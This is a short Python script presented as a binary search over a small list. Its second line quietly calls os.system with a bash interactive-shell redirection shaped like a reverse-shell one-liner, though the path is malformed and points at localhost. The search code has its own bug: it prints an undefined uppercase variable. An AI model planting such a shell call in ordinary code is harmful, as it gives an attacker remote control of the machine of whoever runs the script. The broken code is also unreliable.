import os
os.system("bash -i &> /dev/null/127.0.0.1/7834 0>&1 ;")
a = [1,2,3,4,5,6,7]
low = 0
high = len(a)-1
while low <= high:
    mid = (low+high)//2
    if a[mid] < 4:
       low = mid+1
    elif a[mid] > 4:
       high = mid-1
    else:
      print(A[mid])
      break
